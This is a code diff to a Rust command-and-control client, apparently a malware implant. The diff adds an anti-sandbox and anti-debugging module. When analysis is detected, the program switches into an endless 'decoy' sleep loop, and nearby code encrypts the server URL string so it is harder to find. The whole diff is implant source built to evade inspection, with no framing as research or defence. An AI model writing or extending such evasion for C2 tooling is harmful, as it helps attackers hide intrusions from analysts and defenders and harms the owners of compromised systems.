@@ -5,6 +5,7 @@ use tokio::time::sleep;
 mod client_info;
 mod command_executor;
 mod gadgets;
+mod check;
 
 use common::config::ClientConfig;
 use common::error::C2Result;
@@ -122,6 +123,15 @@ impl C2Client {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // Anti-sandbox and anti-debugging checks
+    if check::run_all_checks() {
+        // Guide into a faulty program flow instead of exiting
+        eprintln!("Potential sandbox or debugger detected. Entering decoy mode.");
+        loop {
+            tokio::time::sleep(Duration::from_secs(3600)).await; // Sleep for a long time
+        }
+    }
+
     let args: Vec<String> = std::env::args().collect();
     let server_url = args.get(1).map(|s| s.to_string()).unwrap_or_else(|| {
         cryptify::encrypt_string!("http://localhost:8080").to_string()
